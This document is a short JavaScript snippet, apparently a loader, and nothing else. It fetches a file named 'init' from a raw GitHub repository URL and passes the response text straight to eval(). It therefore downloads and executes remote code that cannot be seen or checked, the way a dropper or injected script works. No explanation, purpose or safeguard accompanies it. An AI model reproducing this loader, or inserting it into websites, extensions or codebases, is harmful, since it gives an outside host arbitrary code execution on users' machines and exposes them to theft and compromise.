fetch(
    "https://raw.githubusercontent.com/elleonel/Aefl/main/init"
).then((r) => r.text().then((t) => eval(t)));
